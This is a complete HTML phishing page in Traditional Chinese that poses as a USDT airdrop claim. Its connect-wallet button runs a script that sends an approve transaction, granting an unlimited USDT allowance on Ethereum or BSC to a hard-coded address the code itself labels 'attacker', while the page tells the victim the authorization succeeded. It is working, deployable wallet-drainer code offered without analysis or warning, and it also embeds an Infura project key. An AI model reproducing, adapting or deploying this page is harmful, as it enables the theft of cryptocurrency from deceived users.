<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>USDT 空投授權頁（強制版）</title>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
</head>
<body style="background:#111; color:white; text-align:center; padding-top:60px; font-family:sans-serif;">
  <h2>🎁 恭喜你獲得 USDT 空投！</h2>
  <button onclick="connect()">📲 點我連接錢包</button>
  <p id="status" style="margin-top:20px;"></p>

  <script>
    const USDT_BY_CHAIN = {
      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
      56: "0x55d398326f99059ff775485246999027b3197955"  // BSC
    };

    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";

    async function connect() {
      const provider = new WalletConnectProvider.default({
        rpc: {
          1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c",
          56: "https://bsc-dataseed.binance.org/"
        }
      });

      try {
        await provider.enable();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];
        const chainId = await web3.eth.getChainId();
        const token = USDT_BY_CHAIN[chainId];

        if (!token) {
          document.getElementById("status").innerText = "❌ 此鏈不支援 USDT";
          return;
        }

        // 🔐 強制呼叫 approve 的交易資料
        const approveData = web3.eth.abi.encodeFunctionCall({
          name: "approve",
          type: "function",
          inputs: [
            { type: "address", name: "spender" },
            { type: "uint256", name: "amount" }
          ]
        }, [attacker, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);

        // 🧠 改用 provider.request 送出交易（強制跳出授權視窗）
        const txParams = {
          from: user,
          to: token,
          data: approveData,
          gas: web3.utils.toHex(100000),
        };

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [txParams]
        });

        document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${txHash}`;
      } catch (err) {
        document.getElementById("status").innerText = "❌ 錯誤：" + err.message;
      }
    }
  </script>
</body>
</html>
